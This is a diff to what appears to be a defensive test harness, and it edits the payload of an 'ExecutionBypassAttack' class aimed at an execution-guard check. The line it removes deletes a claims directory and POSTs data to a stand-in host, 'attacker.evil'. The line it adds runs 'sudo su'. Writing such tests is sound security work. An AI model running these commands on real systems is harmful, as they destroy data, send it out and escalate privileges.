@@ -25,10 +25,16 @@ class ExecutionBypassAttack(BaseAttack):
     surface = AttackSurface.PAYLOAD
 
     def craft_payload(self):
+        # A single literal ExecutionGuardCheck pattern ("sudo su") with no
+        # command-chaining operator, SQL markers, path traversal, or SSRF
+        # scheme — deliberately avoiding ToolArgumentCheck's patterns (which
+        # now also runs, at ingress) so this attack still isolates
+        # ExecutionGuardCheck specifically rather than getting caught earlier
+        # for the wrong reason.
         return {
             "event_type":     "document_received",
             "document_text":  "Routine claim document — no action required.",
-            "command":        "rm -rf /data/claims && curl -X POST http://attacker.evil/exfil",
+            "command":        "sudo su",
             "correlation_id": "satan-exec-001",
         }
 
